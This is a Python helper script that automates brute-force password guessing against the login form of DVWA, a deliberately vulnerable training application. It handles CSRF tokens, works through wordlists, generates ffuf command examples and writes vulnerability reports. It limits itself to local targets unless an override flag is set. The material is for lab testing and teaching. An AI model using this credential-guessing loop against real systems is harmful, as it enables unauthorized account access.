#!/usr/bin/env python3
"""DVWA Brute Force reference helper.

This script is not the primary skill workflow. Codex should first inspect the
live page and source, then generate task-specific tests. Keep this helper for
environment smoke tests, regression checks, and comparison reports.
"""

from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import ipaddress
import json
import socket
import sys
import time
from dataclasses import dataclass
from html.parser import HTMLParser
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

try:
    import requests
except ImportError as exc:  # pragma: no cover - exercised by users without deps
    raise SystemExit(
        "Missing dependency: requests. Install with: py -m pip install -r scripts/requirements.txt"
    ) from exc


TOOL_VERSION = "0.2.0"
MODULES = {
    "brute-force": "vulnerabilities/brute/",
    "brute": "vulnerabilities/brute/",
}
DIFFICULTIES = {"low", "medium", "high", "impossible"}
DEFAULT_USERNAMES = ["admin", "gordonb", "pablo", "1337", "smithy"]
DEFAULT_PASSWORDS = ["password", "abc123", "letmein", "charley", "admin", "123456", "qwerty"]
DISCOVERY_PASSWORDS = ["__not_the_password__", "abc123", "letmein", "charley", "admin", "123456", "qwerty", "password"]


class InputParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.inputs: Dict[str, str] = {}

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        if tag.lower() != "input":
            return
        values = {key.lower(): value or "" for key, value in attrs}
        name = values.get("name")
        if name:
            self.inputs[name] = values.get("value", "")


@dataclass
class Attempt:
    username: str
    password: str
    status_code: int
    elapsed_ms: int
    success: bool
    evidence: str

    def to_json(self) -> Dict[str, object]:
        return {
            "username": self.username,
            "password": self.password,
            "status_code": self.status_code,
            "elapsed_ms": self.elapsed_ms,
            "success": self.success,
            "evidence": self.evidence,
        }


def now_iso() -> str:
    return dt.datetime.now(dt.timezone.utc).astimezone().isoformat(timespec="seconds")


def normalize_base_url(url: str) -> str:
    if not url.endswith("/"):
        url += "/"
    parsed = urlparse(url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError(f"Invalid DVWA URL: {url}")
    return url


def is_private_or_local_url(url: str) -> bool:
    host = urlparse(url).hostname
    if not host:
        return False
    if host.lower() in {"localhost", "127.0.0.1", "::1"}:
        return True
    try:
        addresses = {socket.gethostbyname(host)}
    except socket.gaierror:
        addresses = {host}
    for address in addresses:
        try:
            ip = ipaddress.ip_address(address)
        except ValueError:
            continue
        if ip.is_loopback or ip.is_private:
            return True
    return False


def parse_inputs(html: str) -> Dict[str, str]:
    parser = InputParser()
    parser.feed(html)
    return parser.inputs


def response_excerpt(text: str, limit: int = 180) -> str:
    collapsed = " ".join(text.replace("\x00", "").split())
    if len(collapsed) <= limit:
        return collapsed
    return collapsed[: limit - 3] + "..."


def load_wordlist(path: Optional[str], defaults: List[str]) -> Tuple[List[str], str]:
    if not path:
        return defaults, "generated-defaults"
    values: List[str] = []
    for line in Path(path).read_text(encoding="utf-8", errors="replace").splitlines():
        item = line.strip()
        if item and not item.startswith("#"):
            values.append(item)
    return values, str(Path(path).resolve())


def generate_password_candidates(args: argparse.Namespace) -> Tuple[List[str], str]:
    if args.passwords:
        return load_wordlist(args.passwords, DEFAULT_PASSWORDS)
    if args.mode == "fast":
        return DEFAULT_PASSWORDS, "generated-defaults-fast"
    return DISCOVERY_PASSWORDS, "generated-discovery-candidates"


def candidate_pairs(usernames: List[str], passwords: List[str], max_attempts: int) -> Iterable[Tuple[str, str]]:
    count = 0
    for username in usernames:
        for password in passwords:
            if count >= max_attempts:
                return
            count += 1
            yield username, password


def move_value_to_end(values: List[str], value: str) -> List[str]:
    if value not in values:
        return values
    return [item for item in values if item != value] + [value]


def observation(step: str, detail: str, data: Optional[Dict[str, object]] = None) -> Dict[str, object]:
    item: Dict[str, object] = {"step": step, "detail": detail}
    if data:
        item["data"] = data
    return item


def classify_brute_response(html: str) -> Tuple[bool, str]:
    lower = html.lower()
    if "welcome to the password protected area" in lower:
        return True, "Response contains DVWA protected-area welcome text."
    if "username and/or password incorrect" in lower:
        return False, "Response contains DVWA incorrect-credential message."
    if "account locked" in lower or "locked" in lower:
        return False, "Response indicates account lockout or defensive throttling."
    return False, response_excerpt(html)


def find_source_file(source_path: Optional[str], difficulty: str) -> Optional[Path]:
    if not source_path:
        return None
    root = Path(source_path)
    candidates = []
    if root.is_file():
        candidates.append(root)
    else:
        candidates.extend(
            [
                root / "vulnerabilities" / "brute" / "source" / f"{difficulty}.php",
                root / "DVWA" / "vulnerabilities" / "brute" / "source" / f"{difficulty}.php",
                root / "dvwa" / "vulnerabilities" / "brute" / "source" / f"{difficulty}.php",
            ]
        )
    for candidate in candidates:
        if candidate.exists():
            return candidate.resolve()
    return None


def review_source(source_path: Optional[str], difficulty: str) -> Dict[str, object]:
    source_file = find_source_file(source_path, difficulty)
    if not source_file:
        return {"provided": bool(source_path), "found": False}
    data = source_file.read_bytes()
    text = data.decode("utf-8", errors="replace")
    indicators = {
        "direct_sql_interpolation": "$_GET" in text and "SELECT" in text.upper(),
        "escaping": "mysqli_real_escape_string" in text or "htmlspecialchars" in text,
        "prepared_statement": "prepare(" in text or "bind_param" in text,
        "sleep_or_delay": "sleep(" in text or "usleep(" in text,
        "csrf_user_token": "user_token" in text or "checkToken" in text,
        "lockout_or_counter": "failed_login" in text or "account_locked" in text or "lockout" in text.lower(),
    }
    return {
        "provided": True,
        "found": True,
        "path": str(source_file),
        "size_bytes": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
        "indicators": indicators,
        "analysis": source_analysis(indicators),
    }


def source_analysis(indicators: Dict[str, bool]) -> List[str]:
    notes = []
    if indicators.get("direct_sql_interpolation"):
        notes.append("The source appears to build SQL directly from request data; test authentication and SQL behavior carefully.")
    if indicators.get("escaping"):
        notes.append("The source contains escaping/encoding controls; expect some injection payloads to fail but brute-force may still be possible.")
    if indicators.get("prepared_statement"):
        notes.append("Prepared statements are present; direct SQL injection is less likely.")
    if indicators.get("sleep_or_delay"):
        notes.append("Delay logic is present; keep brute-force attempts conservative and report timing impact.")
    if indicators.get("csrf_user_token"):
        notes.append("A user_token/CSRF control is present; fetch a fresh token before attempts.")
    if indicators.get("lockout_or_counter"):
        notes.append("Lockout or failed-login counters are present; avoid large attack loops and classify defenses.")
    if not notes:
        notes.append("No obvious token, delay, lockout, escaping, or prepared-query controls were detected.")
    return notes


class DvwaClient:
    def __init__(self, base_url: str, proxy: Optional[str], timeout: int) -> None:
        self.base_url = normalize_base_url(base_url)
        self.session = requests.Session()
        self.timeout = timeout
        if proxy:
            self.session.proxies.update({"http": proxy, "https": proxy})
            self.session.verify = False
            requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

    def get(self, path: str, **kwargs) -> requests.Response:
        return self.session.get(urljoin(self.base_url, path), timeout=self.timeout, **kwargs)

    def post(self, path: str, **kwargs) -> requests.Response:
        return self.session.post(urljoin(self.base_url, path), timeout=self.timeout, **kwargs)

    def cookie_header(self) -> str:
        return "; ".join(f"{cookie.name}={cookie.value}" for cookie in self.session.cookies)

    def login(self, username: str, password: str) -> None:
        page = self.get("login.php")
        inputs = parse_inputs(page.text)
        data = {
            "username": username,
            "password": password,
            "Login": "Login",
        }
        if "user_token" in inputs:
            data["user_token"] = inputs["user_token"]
        response = self.post("login.php", data=data, allow_redirects=True)
        lower = response.text.lower()
        if "logout.php" not in lower and "security.php" not in lower:
            raise RuntimeError("DVWA login failed; verify URL and credentials.")

    def set_security(self, difficulty: str) -> None:
        page = self.get("security.php")
        inputs = parse_inputs(page.text)
        data = {"security": difficulty, "seclev_submit": "Submit"}
        if "user_token" in inputs:
            data["user_token"] = inputs["user_token"]
        response = self.post("security.php", data=data, allow_redirects=True)
        if response.status_code >= 400:
            raise RuntimeError(f"Failed to set DVWA security level: HTTP {response.status_code}")

    def brute_attempt(self, endpoint: str, username: str, password: str, refresh_token: bool) -> Attempt:
        params = {"username": username, "password": password, "Login": "Login"}
        if refresh_token:
            page = self.get(endpoint)
            inputs = parse_inputs(page.text)
            if "user_token" in inputs:
                params["user_token"] = inputs["user_token"]
        started = time.monotonic()
        response = self.get(endpoint, params=params, allow_redirects=True)
        elapsed_ms = int((time.monotonic() - started) * 1000)
        success, evidence = classify_brute_response(response.text)
        return Attempt(username, password, response.status_code, elapsed_ms, success, evidence)


def run_brute_force(args: argparse.Namespace) -> Dict[str, object]:
    started_at = now_iso()
    walkthrough = args.mode == "walkthrough"
    observations: List[Dict[str, object]] = []
    baseline_probe: Optional[Attempt] = None
    base_url = normalize_base_url(args.url)
    local_or_private = is_private_or_local_url(base_url)
    if not local_or_private and not args.allow_non_local:
        raise RuntimeError(
            "Target is not localhost/private. Re-run only for an authorized DVWA lab with --allow-non-local."
        )
    if args.difficulty not in DIFFICULTIES:
        raise RuntimeError(f"Unsupported difficulty: {args.difficulty}")

    usernames, username_source = load_wordlist(args.usernames, DEFAULT_USERNAMES)
    passwords, password_source = generate_password_candidates(args)
    if args.avoid_default_first:
        passwords = move_value_to_end(passwords, args.password)
        observations.append(
            observation(
                "test-generation",
                "Moved the known DVWA login password to the end of the candidate list to force observation before success.",
                {"known_password": args.password, "password_count": len(passwords)},
            )
        )
    source_review = review_source(args.source_path, args.difficulty)
    if source_review.get("found"):
        indicators = source_review.get("indicators", {})
        observations.append(
            observation(
                "source-review",
                "Reviewed the DVWA Brute Force source file for the selected difficulty.",
                {"path": source_review.get("path"), "indicators": indicators},
            )
        )
    client = DvwaClient(base_url, args.proxy, args.timeout)

    client.login(args.username, args.password)
    observations.append(observation("login", "Authenticated to DVWA with the user-provided lab account."))
    client.set_security(args.difficulty)
    observations.append(observation("security", f"Set DVWA security level to {args.difficulty}."))
    endpoint = MODULES[args.module]
    module_page = client.get(endpoint)
    module_inputs = parse_inputs(module_page.text)
    observations.append(
        observation(
            "module-inspection",
            "Loaded the Brute Force module and inspected visible/hidden input fields.",
            {
                "endpoint": endpoint,
                "input_names": sorted(module_inputs.keys()),
                "has_user_token": "user_token" in module_inputs,
                "response_excerpt": response_excerpt(module_page.text),
            },
        )
    )
    tool_artifacts = write_tool_artifacts(args, client, endpoint) if args.export_tool_artifacts else {}

    refresh_token = args.difficulty in {"high", "impossible"}
    if walkthrough:
        baseline_probe = client.brute_attempt(endpoint, "__dvwa_probe__", "__not_the_password__", refresh_token)
        observations.append(
            observation(
                "baseline-probe",
                "Submitted a deliberately invalid credential to learn the failure response marker before brute-force attempts.",
                baseline_probe.to_json(),
            )
        )
    attempts: List[Attempt] = []
    found: Optional[Attempt] = None
    for username, password in candidate_pairs(usernames, passwords, args.max_attempts):
        attempt = client.brute_attempt(endpoint, username, password, refresh_token)
        attempts.append(attempt)
        if attempt.success:
            found = attempt
            observations.append(
                observation(
                    "success-classification",
                    "Detected a successful credential using the DVWA protected-area response marker.",
                    attempt.to_json(),
                )
            )
            if not args.exhaustive:
                break

    if found and args.difficulty == "impossible":
        status = "credential_valid"
        severity = "none"
        recommendations = [
            "Known-valid credential login succeeded, but this does not prove a brute-force vulnerability.",
            "Review lockout, CSRF validation, and failed-login counters for the defensive behavior.",
        ]
    elif found:
        status = "vulnerable"
        severity = "high" if args.difficulty in {"low", "medium", "high"} else "low"
        recommendations = [
            "Add account lockout or throttling.",
            "Use CSRF tokens consistently.",
            "Avoid distinguishable failure responses and log failed attempts.",
        ]
    else:
        status = "not_vulnerable" if args.difficulty == "impossible" else "inconclusive"
        severity = "none" if status == "not_vulnerable" else "low"
        recommendations = [
            "Expand the wordlist or inspect source code if this was intended to be solved.",
            "Verify the DVWA security level and session state.",
        ]

    finished_at = now_iso()
    return {
        "metadata": {
            "tool": "dvwa_runner.py",
            "version": TOOL_VERSION,
            "mode": args.mode,
            "started_at": started_at,
            "finished_at": finished_at,
            "target": base_url,
            "module": "brute-force",
            "difficulty": args.difficulty,
        },
        "scope": {
            "authorized_lab": True,
            "local_or_private_target": local_or_private,
            "source_path": args.source_path,
            "allow_non_local": bool(args.allow_non_local),
        },
        "source_review": source_review,
        "tool_artifacts": tool_artifacts,
        "process": observations,
        "baseline_probe": baseline_probe.to_json() if baseline_probe else None,
        "test_generation": {
            "strategy": "wordlist" if args.usernames or args.passwords else password_source,
            "username_source": username_source,
            "password_source": password_source,
            "usernames": len(usernames),
            "passwords": len(passwords),
            "max_attempts": args.max_attempts,
            "avoid_default_first": bool(args.avoid_default_first or walkthrough),
            "refresh_token_per_attempt": refresh_token,
            "rationale": test_generation_rationale(args, source_review, refresh_token),
        },
        "attempts": [attempt.to_json() for attempt in attempts],
        "finding": {
            "status": status,
            "severity": severity,
            "credential": {"username": found.username, "password": found.password} if found else None,
            "evidence": [found.evidence] if found else [attempts[-1].evidence if attempts else "No attempts executed."],
        },
        "recommendations": recommendations,
    }


def write_tool_artifacts(args: argparse.Namespace, client: DvwaClient, endpoint: str) -> Dict[str, str]:
    artifact_dir = Path(args.output_dir) / "tool-artifacts"
    artifact_dir.mkdir(parents=True, exist_ok=True)
    target = urljoin(client.base_url, endpoint)
    parsed = urlparse(target)
    token_param = "&user_token=TOKEN_PER_REQUEST" if args.difficulty in {"high", "impossible"} else ""
    request_target = f"{parsed.path}?username=FUZZUSER&password=FUZZPASS&Login=Login{token_param}"
    cookie_header = client.cookie_header()
    raw_request = "\n".join(
        [
            f"GET {request_target} HTTP/1.1",
            f"Host: {parsed.netloc}",
            "User-Agent: dvwa-automated-testing/0.1",
            f"Cookie: {cookie_header}",
            "Connection: close",
            "",
            "",
        ]
    )
    raw_path = artifact_dir / f"brute-force-{args.difficulty}-request.http"
    raw_path.write_text(raw_request, encoding="utf-8")

    ffuf_note = "# High and impossible levels need a fresh user_token per attempt; use a token-aware generated harness or Burp macros.\n"
    ffuf_command = (
        ffuf_note
        + f'ffuf -u "{target}?username=FUZZUSER&password=FUZZ&Login=Login" '
        + '-w ".\\passwords.txt" '
        + f'-H "Cookie: {cookie_header}" '
        + '-mr "Welcome to the password protected area"\n'
    )
    ffuf_path = artifact_dir / f"brute-force-{args.difficulty}-ffuf-example.ps1"
    ffuf_path.write_text(ffuf_command, encoding="utf-8")
    return {"raw_request": str(raw_path), "ffuf_example": str(ffuf_path)}


def test_generation_rationale(
    args: argparse.Namespace,
    source_review: Dict[str, object],
    refresh_token: bool,
) -> List[str]:
    notes = [
        "Start with an invalid baseline request to learn failure markers.",
        "Classify success by response content rather than assuming status-code differences.",
    ]
    if args.passwords:
        notes.append("Use the user-supplied password wordlist rather than built-in candidates.")
    elif args.mode == "fast":
        notes.append("Fast mode uses lab-default candidates and may find known DVWA credentials immediately.")
    else:
        notes.append("Walkthrough mode uses discovery candidates and keeps the known lab password late in the sequence.")
    if refresh_token:
        notes.append("Fetch a fresh user_token before each attempt for this difficulty.")
    analysis = source_review.get("analysis")
    if isinstance(analysis, list):
        notes.extend(str(item) for item in analysis)
    return notes


def write_reports(report: Dict[str, object], output_dir: str) -> Tuple[Path, Path]:
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    metadata = report["metadata"]  # type: ignore[index]
    stamp = str(metadata["started_at"]).replace(":", "").replace("-", "")[:15]  # type: ignore[index]
    stem = f"dvwa-{metadata['module']}-{metadata['difficulty']}-{stamp}"  # type: ignore[index]
    json_path = out / f"{stem}.json"
    md_path = out / f"{stem}.md"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    md_path.write_text(render_markdown(report), encoding="utf-8")
    return json_path, md_path


def render_markdown(report: Dict[str, object]) -> str:
    metadata = report["metadata"]  # type: ignore[index]
    finding = report["finding"]  # type: ignore[index]
    test_generation = report["test_generation"]  # type: ignore[index]
    attempts = report["attempts"]  # type: ignore[index]
    source_review = report["source_review"]  # type: ignore[index]
    credential = finding.get("credential")  # type: ignore[union-attr]

    lines = [
        "# DVWA Vulnerability Report",
        "",
        "## Summary",
        "",
        f"- Target: `{metadata['target']}`",
        f"- Module: `{metadata['module']}`",
        f"- Difficulty: `{metadata['difficulty']}`",
        f"- Status: `{finding['status']}`",
        f"- Severity: `{finding['severity']}`",
        f"- Attempts: `{len(attempts)}`",
    ]
    if credential:
        lines.append(f"- Credential: `{credential['username']}:{credential['password']}`")
    if metadata.get("mode"):
        lines.append(f"- Mode: `{metadata['mode']}`")
    lines.extend(
        [
            "",
            "## Test Generation",
            "",
            f"- Strategy: `{test_generation['strategy']}`",
            f"- Username source: `{test_generation['username_source']}`",
            f"- Password source: `{test_generation['password_source']}`",
            f"- Max attempts: `{test_generation['max_attempts']}`",
            f"- Avoid default first: `{test_generation.get('avoid_default_first')}`",
            f"- Refresh token per attempt: `{test_generation.get('refresh_token_per_attempt')}`",
            "",
            "## Test Rationale",
            "",
        ]
    )
    for note in test_generation.get("rationale", []):
        lines.append(f"- {note}")
    process = report.get("process") or []
    if process:
        lines.extend(["", "## Walkthrough Process", ""])
        for index, item in enumerate(process, start=1):
            step = item.get("step", "step")
            detail = item.get("detail", "")
            lines.append(f"{index}. `{step}` - {detail}")
            data = item.get("data")
            if isinstance(data, dict):
                compact = json.dumps(data, ensure_ascii=False)
                if len(compact) > 500:
                    compact = compact[:497] + "..."
                lines.append(f"   Data: `{compact}`")
    baseline = report.get("baseline_probe")
    if baseline:
        lines.extend(
            [
                "",
                "## Baseline Probe",
                "",
                f"- Username: `{baseline['username']}`",
                f"- Password: `{baseline['password']}`",
                f"- Success: `{baseline['success']}`",
                f"- Evidence: {baseline['evidence']}",
                "",
            ]
        )
    if attempts:
        lines.extend(["", "## Attempt Summary", ""])
        for index, attempt in enumerate(attempts[:20], start=1):
            marker = "success" if attempt.get("success") else "failure"
            lines.append(
                f"{index}. `{attempt['username']}:{attempt['password']}` - {marker}, "
                f"HTTP {attempt['status_code']}, {attempt['elapsed_ms']} ms"
            )
        if len(attempts) > 20:
            lines.append(f"- {len(attempts) - 20} additional attempts omitted from Markdown; see JSON report.")
    lines.extend(
        [
            "",
            "## Evidence",
            "",
        ]
    )
    for evidence in finding.get("evidence", []):  # type: ignore[union-attr]
        lines.append(f"- {evidence}")
    lines.extend(["", "## Source Review", ""])
    if source_review.get("found"):  # type: ignore[union-attr]
        lines.append(f"- Path: `{source_review['path']}`")  # type: ignore[index]
        lines.append(f"- SHA-256: `{source_review['sha256']}`")  # type: ignore[index]
        indicators = source_review.get("indicators", {})  # type: ignore[union-attr]
        for key, value in indicators.items():
            lines.append(f"- {key}: `{value}`")
        for note in source_review.get("analysis", []):  # type: ignore[union-attr]
            lines.append(f"- analysis: {note}")
    else:
        lines.append("- Source file not found or not provided.")
    lines.extend(["", "## Recommendations", ""])
    for item in report["recommendations"]:  # type: ignore[index]
        lines.append(f"- {item}")
    tool_artifacts = report.get("tool_artifacts") or {}
    if tool_artifacts:
        lines.extend(["", "## Tool Artifacts", ""])
        for name, path in tool_artifacts.items():
            lines.append(f"- {name}: `{path}`")
    return "\n".join(lines) + "\n"


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Automate authorized DVWA lab testing.")
    parser.add_argument("--url", required=True, help="DVWA base URL, e.g. http://127.0.0.1/dvwa/")
    parser.add_argument("--username", required=True, help="DVWA login username")
    parser.add_argument("--password", required=True, help="DVWA login password")
    parser.add_argument("--module", default="brute-force", choices=sorted(MODULES.keys()))
    parser.add_argument("--difficulty", required=True, choices=sorted(DIFFICULTIES))
    parser.add_argument("--source-path", help="DVWA source root or specific source file")
    parser.add_argument("--usernames", help="Username wordlist")
    parser.add_argument("--passwords", help="Password wordlist")
    parser.add_argument("--max-attempts", type=int, default=100)
    parser.add_argument(
        "--mode",
        default="walkthrough",
        choices=["walkthrough", "fast"],
        help="walkthrough records exploration steps; fast prioritizes quick solution",
    )
    parser.add_argument(
        "--avoid-default-first",
        action="store_true",
        help="Move the supplied DVWA login password to the end of generated candidates",
    )
    parser.add_argument("--exhaustive", action="store_true", help="Continue after finding a valid credential")
    parser.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 for Burp/ZAP")
    parser.add_argument("--export-tool-artifacts", action="store_true", help="Write Burp/ZAP raw request and ffuf examples")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--allow-non-local", action="store_true", help="Allow explicitly authorized non-local DVWA URL")
    parser.add_argument("--output-dir", default="dvwa-results")
    return parser


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        report = run_brute_force(args)
        json_path, md_path = write_reports(report, args.output_dir)
    except Exception as exc:
        print(f"[ERROR] {exc}", file=sys.stderr)
        return 1
    print(f"[OK] JSON report: {json_path}")
    print(f"[OK] Markdown report: {md_path}")
    finding = report["finding"]  # type: ignore[index]
    print(f"[OK] Status: {finding['status']} severity={finding['severity']}")  # type: ignore[index]
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
